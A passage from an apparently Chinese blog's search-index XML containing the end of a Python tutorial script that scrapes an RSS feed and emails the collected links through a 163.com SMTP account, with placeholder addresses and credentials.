punctuation">(</span>smtpaddr<span class="token punctuation">)</span>  <span class="token comment"># 连接smtp服务器</span>        s<span class="token punctuation">.</span>login<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>  <span class="token comment"># 登录邮箱</span>        s<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> mail_msg<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 发送邮件</span>        s<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Successfully sent email"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error: unable to send email"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>traceback<span class="token punctuation">.</span>format_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 回溯错误问题所在</span><span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 '</span>                             <span class="token string">'Safari/537.36'</span><span class="token punctuation">}</span>    page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>  <span class="token comment"># 获取网页</span>    page<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    page_content <span class="token operator">=</span> page<span class="token punctuation">.</span>text  <span class="token comment"># 变为文本格式</span>    f <span class="token operator">=</span> codecs<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 将刚才的文本写入TXT文件中去</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>page_content<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    rss <span class="token operator">=</span> feedparser<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">)</span>  <span class="token comment"># 将文本文件用函数解析成一个字典</span>    msg <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 定义一个变量</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rss<span class="token punctuation">.</span>entries<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tag_a <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取链接</span>        tag_title <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token comment"># 获取标题 </span>        tag_content <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token comment">#获取内容</span>        msg <span class="token operator">=</span> msg <span class="token operator">+</span> <span class="token triple-quoted-string string">"""        &lt;p&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;&lt;/p&gt;        """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>tag_a<span class="token punctuation">,</span> tag_title<span class="token punctuation">)</span>     <span class="token comment"># 文本中带入变量的方法</span>    <span class="token keyword">return</span> msg<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    fromaddr <span class="token operator">=</span> <span class="token string">"xxxxxxxxxxx@163.com"</span>    smtpaddr <span class="token operator">=</span> <span class="token string">"smtp.163.com"</span>    toaddrs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"xxxxxxxx@qq.com"</span><span class="token punctuation">,</span>"xxxxx@hotmail<span class="token punctuation">.</span>com”<span class="token punctuation">]</span>    subject <span class="token operator">=</span> <span class="token string">"获取的xxx信息"</span>    password <span class="token operator">=</span> <span class="token string">"xxxxxxx"</span>   <span class="token comment">#这里需要登录163邮箱自己设置授权码</span>    url <span class="token operator">=</span> <span class="token string">'https://www.xxxxxx.com/rss/'</span>  <span class="token comment"># 要爬取的rss某网页</span>    msg <span class="token operator">=</span> get_info<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token comment">#爬取的内容（html格式）</span>    sendmail<span class="token punctuation">(</span>subject<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> fromaddr<span class="token punctuation">,</span> smtpaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>  <span class="token comment"># 发送邮件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>！</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
